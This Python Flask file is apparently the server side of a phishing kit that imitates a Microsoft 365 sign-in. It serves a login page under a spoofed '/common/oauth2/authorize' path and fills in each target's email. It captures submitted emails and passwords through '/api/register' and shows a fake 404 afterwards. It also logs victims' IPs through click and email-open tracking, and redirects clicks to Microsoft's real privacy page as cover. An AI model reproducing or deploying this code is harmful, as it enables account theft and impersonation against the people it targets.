from flask import render_template, redirect, request, Blueprint
import app.controllers.lines as lc

lines = Blueprint('lc', __name__)


@lines.route("/common/oauth2/authorize",  methods=['GET'])
@lines.route("/",  methods=['GET'])
def check_guid():
    valid_id = False
    email = ''
    client_id = request.args.get('client_id')
    if len(str(client_id)) > 0 and client_id is not None:
        key = lc.validate_client_id(client_id)
        if key:
            ip_address = lc.get_client_ip(request)
            lc.increment_visit(key, ip_address)
            user = lc.get_user_by_key_id(key.id)
            if user:
                valid_id = True
                email = user.email
        else:
            pass
    return render_template("o365/index.html", valid_id=valid_id, email=email)


@lines.route("/api/register",  methods=['POST'])
def register():
    json = request.get_json()
    ip_address = lc.get_client_ip(request)
    client_id = json['client_id']
    key = lc.validate_client_id(client_id)

    if key and key.count <= 5:
        email = json['email']
        password = json['password']
        if lc.create_user(email, password, key.id, ip_address):
            lc.increment_key(key)
    return render_template("error/404.html")


@lines.route("/api/v2/tracking/method/Click",  methods=['GET'])
def track():
    try:
        client_id = request.args.get('mi')
        ip_address = lc.get_client_ip(request)
        key = lc.validate_client_id(client_id)
        if key:
            lc.increment_clicks(key.id, ip_address)
    except:
        pass
    finally:
        return redirect("https://privacy.microsoft.com/en-gb/privacystatement", code=302)


@lines.route("/api/v2/tracking/method/open",  methods=['GET'])
def opened():
    try:
        client_id = request.args.get('img')
        ip_address = lc.get_client_ip(request)
        key = lc.validate_client_id(client_id)
        if key:
            lc.increment_opened(key.id, ip_address)
    except:
        pass
    finally:
        return render_template("error/404.html")
